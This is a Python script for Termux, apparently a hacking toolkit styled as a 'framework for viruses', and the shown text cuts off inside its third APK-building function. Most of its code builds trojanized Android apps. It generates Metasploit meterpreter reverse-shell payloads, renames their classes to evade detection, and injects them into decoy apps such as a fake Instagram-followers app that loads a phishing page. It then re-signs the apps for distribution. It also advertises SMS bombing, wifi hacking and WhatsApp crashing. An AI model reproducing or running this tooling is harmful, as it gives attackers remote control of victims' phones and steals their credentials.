#!/data/data/com.termux/files/usr/bin/python3
version = "Alpha"
import os
import subprocess
BL = '\033[30m'
B = '\033[94m'
C = '\033[96m'
D = '\033[36m'
G = '\033[92m'
P = '\033[95m'
R = '\033[91m'
Y= '\033[93m'
W = '\033[37m'
BLACK_BG = '\033[40m'
RED_BG = '\033[41m'
GREEN_BG = '\033[42m'
YELLOW_BG = '\033[43m'
BLUE_BG = '\033[44m'
PURPLE_BG = '\033[45m'
CYAN_BG = '\033[46m'
WHITE_BG = '\033[47m'
BOLD = '\033[1m'
FAINT = '\033[2m'
ITALIC = '\033[3m'
UNDERLINE = '\033[4m'
BLINK = '\033[5m'
INVERSE = '\033[7m'
HIDDEN = '\033[8m'
STRIKE = '\033[9m'
END = '\033[0m'
def error(error_str,code):
        print(f"{B}[{Y}Error{B}] {R+error_str} ")
def error1(error_str,code):
        print(f"\n{B}[{Y}Error{B}] {R+error_str} ")
        exit(code)
def error2(error_str,code):
        a = (f"{B}[{Y}Error{B}] {R+error_str} \n")
        return a
def success(error_str):
        print(f"{B}[{Y}Success{B}] {G+error_str} ")
def ask(str):
        a = input(f"{B}[{R}  ?  {B}]{C} {str} {G} ")
        return a

logo = f"""{G}
    █───────────────█
    ██─────────────██
     ███████████████
    █████████████████        {C}█▀▄ █ █▀ ▀█▀ █▀█ █ █ █▀▀ ▀█▀   \/{G}
   ███████████████████       {C}█▄▀ █ ▄█  █  █▀▄ █▄█ █▄▄  █    /\\{G}
  ████  █████████  ████
 ███████████████████████    {R}The Advance Framework for Viruses{G}
█████████████████████████  {B}[ {Y}Trojans , Ransomeware , Phishing {B}]{G}

{B}[{R}Version{B}]{C} {version}
{B}[{R}Coders {B}]{C} https://github.com/T-Dynamos
"""
def message(ok):
        print(f"{B}[{Y}  >  {B}] {G+ok} ")	

def execute(command):
        try:
        	from halo import Halo
        	spinner = Halo(text=f'Running {G+command}',spinner= 'dots')
        	spinner.start()
        	a = os.system(command+" > log.txt 2>&1")
        	spinner.stop()
        	if a == 0:
        		return None
        	else:
        		return error(f"Command {G+command} exited with code {a} ")
        except Exception:
        	a = os.system(command+" > log.txt 2>&1")        	
        return a
def check_d(depend):
        for i in depend:
                try:
                        exec(f"import {i}")
                except Exception as e:
                        error(str(e),0)
                        error(f"Unable to import Module {Y+i}",1)
                        ok = "y"
                        if ok == "y":
                        	print()
                        else:
                        	return error("Exiting",1)
						                  
                        a = execute(f"pip3 install {i}")
                        if a == 0:
                                success(f"Installed {i} Successfully ! ")
                                pass
                        else:
                                error(f"Unable to install {Y+i} , pip3 exicted with code {G+str(a)} . {C} Check out {UNDERLINE}log.txt{END+C} for full details .",1)
def check(com):
	from shutil import which 
	a = which(com, mode = os.F_OK | os.X_OK, path = None)
	if a == None:
		return error1(f"{R}Command {G+UNDERLINE+com+END+R} not found",2)
	else:
		pass
link = "https://raw.githubusercontent.com/T-Dynamos/Distruct-X/main/.version.txt"
def check_v():
	import requests
	try:
		ver_rqst = requests.get(link,timeout=3)
		ver_sc = ver_rqst.status_code
		if ver_sc == 200:
			github_ver = ver_rqst.text
			github_ver = github_ver.strip()
			if version == github_ver:
				return None
			else:
				a = (B+ '[' + Y + 'Available'+B+']'+f'{R}'+' Latest version Available {} '.format(github_ver) + C + '')
				return a
		else:
			return None
	except Exception as e:
		a = error2(str(e),1)
		return a	
	
def printBox(str):
	a = len(str)
	print(f'{C}╔═{a*"═"}═╗\n║ {G+str} {C}║\n╚═{a*"═"}═╝')	
text = f"""
{B}[{R}1{B}]{C} Distruct X          {Y}  Advance Sms+Call Bomber     {G} Medium
{B}[{R}2{B}]{C} Wifi Hacker         {Y}  Hack wifi networks          {B} High
{B}[{R}3{B}]{C} InstagramFollowers  {Y}  Site Seaking Followers      {Y} Low
{B}[{R}4{B}]{C} WhatsappBomb        {Y}  Whatsapp Crashing           {G} Medium
{B}[{R}5{B}]{C} SARA                {Y}  Touch Disable               {R} Ultra
{B}[{R}6{B}]{C} Custom Site         {Y}  Made custom phishing        {G} Medium"""
def fix_termux_metasploit():
	 if os.path.exists("/data/data/com.termux/files/usr/bin/bash"):
	 	if os.path.exists("/data/data/com.termux/files/home/metasploit-framework"):
	 		os.system("ln -s /data/data/com.termux/files/home/metasploit-framework/msfvenom /data/data/com.termux/files/usr/bin/msfvenom > log.txt 2>&1")
	 	else:
	 		return None
	 else:
	 	pass
def remove(filename):
	try:
		os.remove(filename)
	except Exception:
		pass
pwd = os.getcwd()	
def makeFile(filename,text):
	remove(filename)
	file1 = open(filename,"w")
	file1.writelines(text)
	file1.close
def res():
	return executeMain()
def build_instagramfollowerspro():
	splash = ask("Enter the new name for splash screen :")
	stringapp = ask("Enter the new name for App Name :")
	link = ask("Enter the phishing link :")
	ok = ask("Do you want to change app icon [y/n]: ")
	if ok == "y":
		icon = ask("Enter the path of png file")
		if os.path.exists(icon):
			pass
		else:
			error ("Icon not found ",1)
			res()
	ok2 = ask("Do you want to change Splash Screen Icon [y/n]")
	if ok2 == "y":
		icon2 = ask("Enter the path of png file")
		if os.path.exists(icon):
			pass
		else:
			error ("Icon not found ",1)
			res()
	else:
		pass
	lhost = ask("Enter the lhost for Metasploit :")
	lport = ask("Enter the lport for Metasploit :")
	pathout = ask("Enter the output path :")
	
	print(W+f"""
{B}╔═══════════════════════════════════════╗
║      {G} Available Types of Payload{B}      ║
║                                       ║
║{Y}[1] android/meterpreter/reverse_tcp{B}    ║
║{Y}[2] android/meterpreter/reverse_http{B}   ║   
║{Y}[3] android/meterpreter/reverse_https{B}  ║
╚═══════════════════════════════════════╝\n""")
	payload_type = ask(f" Which  Type of Payload, You Want to Create (1/2/3):")
	if payload_type == '1':
	   type_of_payload = "android/meterpreter/reverse_tcp"
	elif payload_type == '2':
		type_of_payload = "android/meterpreter/reverse_http"
	elif payload_type == '3':
	   type_of_payload = "android/meterpreter/reverse_https"
	else:
		error("Wrong Option")
		print()
		res()
	mainxml = f"""<?xml version="1.0" encoding="utf-8"?>
<LinearLayout android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="fill_parent"
  xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto">
    <LinearLayout android:gravity="center_horizontal" android:layout_gravity="center_horizontal" android:orientation="horizontal" android:id="@id/linear1" android:padding="8.0dip" android:layout_width="fill_parent" android:layout_height="500.0dip" android:weightSum="1.0">
        <de.hdodenhof.circleimageview.CircleImageView android:id="@id/circleimageview1" android:layout_width="200.0dip" android:layout_height="wrap_content" android:src="@drawable/ins" app:civ_border_color="#ff008dcd" app:civ_border_overlay="true" app:civ_border_width="3.0dip" app:civ_circle_background_color="#ffffffff" />
    </LinearLayout>
    <LinearLayout android:orientation="vertical" android:id="@id/linear2" android:padding="8.0dip" android:layout_width="fill_parent" android:layout_height="fill_parent">
        <LinearLayout android:orientation="vertical" android:id="@id/linear6" android:padding="8.0dip" android:layout_width="fill_parent" android:layout_height="fill_parent">
            <TextView android:textSize="30.0sp" android:textStyle="bold|italic" android:textColor="#ff000000" android:layout_gravity="center" android:id="@id/textview2" android:padding="8.0dip" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="{splash}" />
            <TextView android:textSize="14.0sp" android:textStyle="bold|italic" android:textColor="#ff000000" android:gravity="center" android:layout_gravity="center" android:id="@id/textview5" android:padding="8.0dip" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="©Copyright  https://github.com/T-Dynamos" />
        </LinearLayout>
    </LinearLayout>
</LinearLayout>"""
	stringsxml = f"""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">{stringapp}</string>
</resources>
"""
	webactivity = '''.class public Lcom/instagramfollowerspro/WebviewActivity;
.super Landroid/app/Activity;
.source "WebviewActivity.java"


# instance fields
.field private webview1:Landroid/webkit/WebView;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 32
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private initialize(Landroid/os/Bundle;)V
    .locals 2

    .prologue
    const/4 v1, 0x1

    .line 45
    const v0, 0x7f040006

    invoke-virtual {p0, v0}, Lcom/instagramfollowerspro/WebviewActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/webkit/WebView;

    iput-object v0, p0, Lcom/instagramfollowerspro/WebviewActivity;->webview1:Landroid/webkit/WebView;

    .line 46
    iget-object v0, p0, Lcom/instagramfollowerspro/WebviewActivity;->webview1:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 47
    iget-object v0, p0, Lcom/instagramfollowerspro/WebviewActivity;->webview1:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setSupportZoom(Z)V

    .line 49
    iget-object v0, p0, Lcom/instagramfollowerspro/WebviewActivity;->webview1:Landroid/webkit/WebView;

    new-instance v1, Lcom/instagramfollowerspro/WebviewActivity$1;

    invoke-direct {v1, p0}, Lcom/instagramfollowerspro/WebviewActivity$1;-><init>(Lcom/instagramfollowerspro/WebviewActivity;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 64
    return-void
.end method

.method private initializeLogic()V
    .locals 2

    .prologue
    .line 67
    iget-object v0, p0, Lcom/instagramfollowerspro/WebviewActivity;->webview1:Landroid/webkit/WebView;

    const-string v1, "'''+link+'''"

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 68
    return-void
.end method


# virtual methods
.method public getCheckedItemPositionsToArray(Landroid/widget/ListView;)Ljava/util/ArrayList;
    .locals 6
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/widget/ListView;",
            ")",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/Double;",
            ">;"
        }
    .end annotation

    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 98
    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    .line 99
    invoke-virtual {p1}, Landroid/widget/ListView;->getCheckedItemPositions()Landroid/util/SparseBooleanArray;

    move-result-object v2

    .line 100
    const/4 v0, 0x0

    :goto_0
    invoke-virtual {v2}, Landroid/util/SparseBooleanArray;->size()I

    move-result v3

    if-lt v0, v3, :cond_0

    .line 104
    return-object v1

    .line 101
    :cond_0
    invoke-virtual {v2, v0}, Landroid/util/SparseBooleanArray;->valueAt(I)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 102
    invoke-virtual {v2, v0}, Landroid/util/SparseBooleanArray;->keyAt(I)I

    move-result v3

    int-to-double v4, v3

    invoke-static {v4, v5}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 100
    :cond_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public getDip(I)F
    .locals 3
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 109
    const/4 v0, 0x1

    int-to-float v1, p1

    invoke-virtual {p0}, Lcom/instagramfollowerspro/WebviewActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    invoke-virtual {v2}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v2

    invoke-static {v0, v1, v2}, Landroid/util/TypedValue;->applyDimension(IFLandroid/util/DisplayMetrics;)F

    move-result v0

    return v0
.end method

.method public getDisplayHeightPixels()I
    .locals 1
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 119
    invoke-virtual {p0}, Lcom/instagramfollowerspro/WebviewActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v0

    iget v0, v0, Landroid/util/DisplayMetrics;->heightPixels:I

    return v0
.end method

.method public getDisplayWidthPixels()I
    .locals 1
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 114
    invoke-virtual {p0}, Lcom/instagramfollowerspro/WebviewActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v0

    iget v0, v0, Landroid/util/DisplayMetrics;->widthPixels:I

    return v0
.end method

.method public getLocationX(Landroid/view/View;)I
    .locals 2
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 78
    const/4 v0, 0x2

    new-array v0, v0, [I

    .line 79
    invoke-virtual {p1, v0}, Landroid/view/View;->getLocationInWindow([I)V

    .line 80
    const/4 v1, 0x0

    aget v0, v0, v1

    return v0
.end method

.method public getLocationY(Landroid/view/View;)I
    .locals 2
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 85
    const/4 v0, 0x2

    new-array v0, v0, [I

    .line 86
    invoke-virtual {p1, v0}, Landroid/view/View;->getLocationInWindow([I)V

    .line 87
    const/4 v1, 0x1

    aget v0, v0, v1

    return v0
.end method

.method public getRandom(II)I
    .locals 2
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 92
    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    .line 93
    sub-int v1, p2, p1

    add-int/lit8 v1, v1, 0x1

    invoke-virtual {v0, v1}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    add-int/2addr v0, p1

    return v0
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 1

    .prologue
    .line 38
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 39
    const v0, 0x7f050001

    invoke-virtual {p0, v0}, Lcom/instagramfollowerspro/WebviewActivity;->setContentView(I)V

    .line 40
    invoke-direct {p0, p1}, Lcom/instagramfollowerspro/WebviewActivity;->initialize(Landroid/os/Bundle;)V

    .line 41
    invoke-direct {p0}, Lcom/instagramfollowerspro/WebviewActivity;->initializeLogic()V

    .line 42
    return-void
.end method

.method public showMessage(Ljava/lang/String;)V
    .locals 2
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 73
    invoke-virtual {p0}, Lcom/instagramfollowerspro/WebviewActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v0, p1, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 74
    return-void
.end method'''
	os.system("rm -rf android_payload.apk android_payload normal_apk 1 final.apk tmp.sh > /dev/null 2>&1")
	os.system("cp -r lib/instagramfollowerspro normal_apk")
	makeFile(f"{pwd}/normal_apk/res/layout/main.xml",mainxml)	
	makeFile(f"{pwd}/normal_apk/res/values/strings.xml",stringsxml)	
	makeFile(f"{pwd}/normal_apk/smali/com/instagramfollowerspro/WebviewActivity.smali", webactivity)
	if ok == "y":
		os.system(f'cp {icon} {pwd}/normal_apk/res/drawable-xhdpi/app_icon.png')
	else:
		pass
	if ok2 == "y":
		os.system(f'cp {icon2} {pwd}/normal_apk/res/drawable-xhdpi/splash.png')
	else:
		pass 	
	message("Creating Payload")
	remove ("android_payload.apk")
	a = (f"msfvenom -p {type_of_payload} LHOST={lhost} LPORT={lport} R> android_payload.apk")
	from halo import Halo
	spinner1= Halo(text=f'{W}Running {G+a}',spinner= 'dots')
	spinner1.start()

	makeFile("tmp.sh",a)
	os.system("bash tmp.sh > /dev/null 2>&1")
	spinner1.stop()
	a = ("rm -rf android_payload > /dev/null 2&>1")
	message ("Decompiling Payload ")

	execute(f"apktool d -f android_payload.apk -o {pwd}/android_payload")
	
	message ("Generating Random Variables")
	
	VAR1 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR1 = str(VAR1.strip()).split('\'')[1]
	VAR2 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR2 = str(VAR2.strip()).split('\'')[1]
	VAR3 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR3 = str(VAR3.strip()).split('\'')[1]
	VAR4 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR4 = str(VAR4.strip()).split('\'')[1]
	VAR5 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR5 = str(VAR5.strip()).split('\'')[1]
	VAR6 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR6 = str(VAR6.strip()).split('\'')[1]
	VAR7 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR7 = str(VAR7.strip()).split('\'')[1]
	VAR8 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR8 = str(VAR8.strip()).split('\'')[1]
	apkName = "ThisIsATest"
	os.system(f"mv {pwd}/android_payload/smali/com/metasploit {pwd}/android_payload/smali/com/{VAR1}")
	os.system(f"mv {pwd}/android_payload/smali/com/{VAR1}/stage {pwd}/android_payload/smali/com/{VAR1}/{VAR2}")
	os.system(f"mv {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/Payload.smali {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
	os.system(f"sed -i \"s#/metasploit/stage#/{VAR1}/{VAR2}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")
	os.system(f"sed -i \"s#Payload#{VAR3}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")
	os.system(f"sed -i \"s#com.metasploit.meterpreter.AndroidMeterpreter#com.{VAR4}.{VAR5}.{VAR6}#\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
	os.system(f"sed -i \"s#payload#{VAR7}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
	os.system(f"sed -i \"s#com.metasploit.stage#com.{VAR1}.{VAR2}#\" {pwd}/android_payload/AndroidManifest.xml")
	os.system(f"sed -i \"s#metasploit#{VAR8}#\" {pwd}/android_payload/AndroidManifest.xml")
	os.system(f"sed -i \"s#MainActivity#{apkName}#\" {pwd}/android_payload/res/values/strings.xml") 
	os.system(f"mv {pwd}/android_payload/smali/com/{VAR1} {pwd}/normal_apk/smali/com/")
	launcherActivity="normal_apk/smali/com/instagramfollowerspro/MainActivity.smali"
	os.system("sed -i \"/method.*onCreate(/ainvoke-static {p0}, Lcom/"+VAR1+"/"+VAR2+"/"+VAR3+";->start(Landroid/content/Context;)V\" "+pwd+"/"+launcherActivity+"")
	message ("Compliling Payload")
	os.chdir(f"normal_apk")
	execute("apktool b -o final.apk")
	message ("Signing Apk")
	os.system('rm ~/.android/debug.keystore > /dev/null 2&>1')
	os.system("keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -addprovider SunPKCS11")
	os.system('jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA final.apk androiddebugkey > /dev/null 2&>1')	
	os.system(f"mv final.apk {pathout}")
	message (f"Saved Successful as {Y+pathout}")
	os.system("cd .. && rm -rf android_payload.apk android_payload normal_apk final.apk tmp.sh")	
def build_distruct_x():
	splash = ask("Enter the new name for splash screen :")
	stringapp = ask("Enter the new name for App Name :")
	ok = ask("Do you want to change app icon [y/n]: ")
	if ok == "y":
		icon = ask("Enter the path of png file")
		if os.path.exists(icon):
			pass
		else:
			error ("Icon not found ",1)
			res()
	ok2 = ask("Do you want to change Splash Screen Icon [y/n]")
	if ok2 == "y":
		icon2 = ask("Enter the path of png file")
		if os.path.exists(icon):
			pass
		else:
			error ("Icon not found ",1)
			res()
	else:
		pass
	lhost = ask("Enter the lhost for Metasploit :")
	lport = ask("Enter the lport for Metasploit :")
	pathout = ask("Enter the output path :")
	
	print(W+f"""
{B}╔═══════════════════════════════════════╗
║      {G} Available Types of Payload{B}      ║
║                                       ║
║{Y}[1] android/meterpreter/reverse_tcp{B}    ║
║{Y}[2] android/meterpreter/reverse_http{B}   ║   
║{Y}[3] android/meterpreter/reverse_https{B}  ║
╚═══════════════════════════════════════╝\n""")
	payload_type = ask(f" Which  Type of Payload, You Want to Create (1/2/3):")
	if payload_type == '1':
	   type_of_payload = "android/meterpreter/reverse_tcp"
	elif payload_type == '2':
		type_of_payload = "android/meterpreter/reverse_http"
	elif payload_type == '3':
	   type_of_payload = "android/meterpreter/reverse_https"
	else:
		error("Wrong Option")
		print()
		res()
	mainxml = f"""<?xml version="1.0" encoding="utf-8"?>
<LinearLayout android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="fill_parent"
  xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto">
    <LinearLayout android:orientation="horizontal" android:id="@id/linear1" android:padding="8.0dip" android:layout_width="fill_parent" android:layout_height="250.0dip" />
    <ImageView android:layout_gravity="center" android:id="@id/imageview1" android:layout_width="200.0dip" android:layout_height="200.0dip" android:src="@drawable/dis" android:scaleType="centerCrop" />
    <LinearLayout android:orientation="horizontal" android:id="@id/linear3" android:padding="8.0dip" android:layout_width="fill_parent" android:layout_height="wrap_content">
        <LinearLayout android:orientation="horizontal" android:id="@id/linear6" android:padding="8.0dip" android:layout_width="fill_parent" android:layout_height="wrap_content" />
    </LinearLayout>
    <TextView android:textSize="16.0sp" android:textColor="#ff000000" android:gravity="center" android:layout_gravity="center" android:id="@id/textview1" android:padding="8.0dip" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="{splash}" />
    <TextView android:textSize="12.0sp" android:textStyle="bold|italic" android:textColor="#ff000000" android:gravity="bottom|center" android:layout_gravity="bottom|center" android:id="@id/textview3" android:padding="8.0dip" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="©Copyright https://gihtub.com/T-Dynamos" />
</LinearLayout>"""
	
#+++++++++++++++++++++++	
	stringsxml = f"""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">{stringapp}</string>
</resources>"""
	os.system("rm -rf android_payload.apk android_payload normal_apk 1 final.apk tmp.sh > /dev/null 2>&1")
	os.system("cp -r lib/distruct-x normal_apk")
	makeFile(f"{pwd}/normal_apk/res/layout/main.xml",mainxml)	
	makeFile(f"{pwd}/normal_apk/res/values/strings.xml",stringsxml)	
	if ok == "y":
		os.system(f'cp {icon} {pwd}/normal_apk/res/drawable-xhdpi/app_icon.png')
	else:
		pass
	if ok2 == "y":
		os.system(f'cp {icon2} {pwd}/normal_apk/res/drawable-xhdpi/splash.png')
	else:
		pass 	
	message("Creating Payload")
	remove ("android_payload.apk")
	a = (f"msfvenom -p {type_of_payload} LHOST={lhost} LPORT={lport} R> android_payload.apk")
	from halo import Halo
	spinner1= Halo(text=f'{W}Running {G+a}',spinner= 'dots')
	spinner1.start()

	makeFile("tmp.sh",a)
	os.system("bash tmp.sh > /dev/null 2>&1")
	spinner1.stop()
	a = ("rm -rf android_payload > /dev/null 2&>1")
	message ("Decompiling Payload ")

	execute(f"apktool d -f android_payload.apk -o {pwd}/android_payload")
	
	message ("Generating Random Variables")
	
	VAR1 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR1 = str(VAR1.strip()).split('\'')[1]
	VAR2 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR2 = str(VAR2.strip()).split('\'')[1]
	VAR3 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR3 = str(VAR3.strip()).split('\'')[1]
	VAR4 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR4 = str(VAR4.strip()).split('\'')[1]
	VAR5 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR5 = str(VAR5.strip()).split('\'')[1]
	VAR6 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR6 = str(VAR6.strip()).split('\'')[1]
	VAR7 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR7 = str(VAR7.strip()).split('\'')[1]
	VAR8 = subprocess.check_output("cat /dev/urandom | tr -cd 'a-z' | head -c 10", shell=True)
	VAR8 = str(VAR8.strip()).split('\'')[1]
	apkName = "ThisIsATest"
	os.system(f"mv {pwd}/android_payload/smali/com/metasploit {pwd}/android_payload/smali/com/{VAR1}")
	os.system(f"mv {pwd}/android_payload/smali/com/{VAR1}/stage {pwd}/android_payload/smali/com/{VAR1}/{VAR2}")
	os.system(f"mv {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/Payload.smali {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
	os.system(f"sed -i \"s#/metasploit/stage#/{VAR1}/{VAR2}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")
	os.system(f"sed -i \"s#Payload#{VAR3}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/*")
	os.system(f"sed -i \"s#com.metasploit.meterpreter.AndroidMeterpreter#com.{VAR4}.{VAR5}.{VAR6}#\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
	os.system(f"sed -i \"s#payload#{VAR7}#g\" {pwd}/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
	os.system(f"sed -i \"s#com.metasploit.stage#com.{VAR1}.{VAR2}#\" {pwd}/android_payload/AndroidManifest.xml")
	os.system(f"sed -i \"s#metasploit#{VAR8}#\" {pwd}/android_payload/AndroidManifest.xml")
	os.system(f"sed -i \"s#MainActivity#{apkName}#\" {pwd}/android_payload/res/values/strings.xml") 
	os.system(f"mv {pwd}/android_payload/smali/com/{VAR1} {pwd}/normal_apk/smali/com/")
	launcherActivity="normal_apk/smali/com/distruct/x/MainActivity.smali"
	os.system("sed -i \"/method.*onCreate(/ainvoke-static {p0}, Lcom/"+VAR1+"/"+VAR2+"/"+VAR3+";->start(Landroid/content/Context;)V\" "+pwd+"/"+launcherActivity+"")
	message ("Compliling Payload")
	os.chdir(f"normal_apk")
	execute("apktool b -o final.apk")
	message ("Signing Apk")
	os.system('rm ~/.android/debug.keystore > /dev/null 2&>1')
	os.system("keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -addprovider SunPKCS11")
	os.system('jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA final.apk androiddebugkey > /dev/null 2&>1')	
	os.system(f"mv final.apk {pathout}")
	message (f"Saved Successful as {Y+pathout}")
	os.system("cd .. && rm -rf android_payload.apk android_payload normal_apk final.apk tmp.sh")	
def build(dir=""):
		
	splash = ask("Enter the new name for splash screen :")
	stringapp = ask("Enter the new name for App Name :")
	ok = ask("Do you want to change app icon [y/n]: ")
	if ok == "y":
		icon = ask("Enter the path of png file")
		if os.path.exists(icon):
			pass
		else:
			error ("Icon not found ",1)
			res()
	ok2 = ask("Do you want to change Splash Screen Icon [y/n]")
	if ok2 == "y":
		icon2 = ask("Enter the path of png file")
		if os.path.exists(icon):
			pass
		else:
			error ("Icon not found ",1)
			res()
	
	else:
		pass
	lhost = ask("Enter the lhost for Metasploit :")
	lport = ask("Enter the lport for Metasploit :")
	pathout = ask("Enter the output path :")
	
	print(W+f"""
{B}╔═══════════════════════════════════════╗
║      {G} Available Types of Payload{B}      ║
║                                       ║
║{Y}[1] android/meterpreter/reverse_tcp{B}    ║
║{Y}[2] android/meterpreter/reverse_http{B}   ║   
║{Y}[3] android/meterpreter/reverse_https{B}  ║
╚═══════════════════════════════════════╝\n""")
	payload_type = ask(f" Which  Type of Payload, You Want to Create (1/2/3):")
	if payload_type == '1':
	   type_of_payload = "android/meterpreter/reverse_tcp"
	elif payload_type == '2':
		type_of_payload = "android/meterpreter/reverse_http"
	elif payload_type == '3':
	   type_of_payload = "android/meterpreter/reverse_https"
	else:
		error("Wrong Option")
		print()
		res()
	mainxml = f"""<?xml version="1.0" encoding="utf-8" ?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="fill_parent">
	<ImageView android:layout_gravity="center" android:id="@id/imageview1" android:layout_width="200.0dip" android:layout_height="200.0dip" android:src="@drawable/splash" android:scaleType="centerCrop" android:translationY="20.0dip" />
	<TextView android:textSize="20.0sp" android:textStyle="bold|italic" android:textColor="#ff000000" android:layout_gravity="center" android:id="@id/textview1" android:padding="8.0dip" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="{splash}" android:translationY="10.0dip" />
	<LinearLayout android:orientation="horizontal" android:id="@id/linear1" android:padding="8.0dip" android:layout_width="fill_parent" android:layout_height="fill_parent">
